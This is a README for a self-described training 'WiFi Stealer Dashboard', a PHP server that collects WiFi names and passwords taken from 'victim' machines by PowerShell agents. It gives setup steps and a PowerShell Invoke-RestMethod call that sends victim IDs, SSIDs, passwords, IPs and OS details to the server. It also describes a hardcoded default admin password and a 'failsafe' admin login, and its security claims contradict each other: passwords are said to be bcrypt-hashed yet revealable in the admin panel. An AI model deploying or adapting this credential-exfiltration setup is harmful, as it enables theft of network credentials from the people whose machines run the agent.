# WiFi Stealer Dashboard – Multi-User Edition

A cybersecurity training dashboard with **per-student accounts** so each student's results are completely isolated from others.

---

## File Structure

```
wifi-stealer-multiuser/
├── index.php        ← Main dashboard (login + all tabs)
├── upload.php       ← API endpoint for PowerShell agents
├── setup.php        ← ONE-TIME setup script (delete after use)
├── users.json       ← Stores all user accounts (auto-created)
├── activity.log     ← Admin-readable event log (auto-created)
├── .htaccess        ← Blocks direct browser access to sensitive files
└── creds/           ← Per-student credential log files (auto-created)
    ├── student01_wifi_creds.log
    └── student02_wifi_creds.log
```

---

## First-Time Setup

### Step 1 – Edit `setup.php`
Open `setup.php` and change:
```php
$adminPass  = 'Admin@1234';           // ← Choose a strong password
$adminEmail = 'admin@yourdomain.com'; // ← Your email
```

### Step 2 – Run it once
Visit `http://your-server/setup.php` in a browser.  
You'll see a green confirmation message.

### Step 3 – Delete `setup.php`!
This is critical. Anyone with the URL can re-run it.

```bash
rm setup.php
```

---

## Features

1. **Student Self-Registration**:
   - Students can click the **"📝 Student Sign Up"** tab directly on the login page.
   - They enter their **Username**, **Email**, and **Password**.
   - Their account is created instantly and they are automatically logged into their personal dashboard.
   - Each student can ONLY see their own captures.

2. **Admin Failsafe Login**:
   - Username: `admin`
   - Password: `Admin@1234`
   - Built-in multi-layer matching ensures the instructor is never locked out.

3. **Admin Panel (`admin.php`)**:
   - Displays all registered student names, emails, and passwords (with reveal toggle).
   - Allows monitoring all students' captures grouped by student.
   - Full activity log with timestamps and IPs.

---

## Creating Student Accounts

In the **Manage Users** tab:
- Fill in **Username**, **Password** (min 8 chars), **Email**, and **Role = Student**
- Each student gets their own isolated data view and credential log file

---

## PowerShell Agent Integration

The original PowerShell script needs to POST to `upload.php` instead of the old log file path. Add a student **token** (their username) to the request:

```powershell
# In your .ps1 agent, replace the upload call with:
$token = "student01"   # the student's username
$body  = "$(Get-Date),$victim_id,$ssid,$pass,$ip,$os"
Invoke-RestMethod -Uri "http://your-server/upload.php?token=$token" `
                  -Method POST -Body $body
```

Or send it as a header:
```powershell
Invoke-RestMethod -Uri "http://your-server/upload.php" -Method POST `
                  -Headers @{"X-Student-Token"=$token} -Body $body
```

---

## Security Notes (Closed Lab Use)

- `users.json`, `activity.log`, and all `creds/*.log` files are blocked from direct browser access via `.htaccess`
- Passwords are stored as **bcrypt hashes** (cost 12) — never plaintext
- All login attempts (success and failure) are logged with IP
- Students **cannot** see each other's data
- Disabled accounts cannot log in

---

## Default Login (after setup)

| Field | Value |
|-------|-------|
| Username | `admin` |
| Password | whatever you set in `setup.php` |

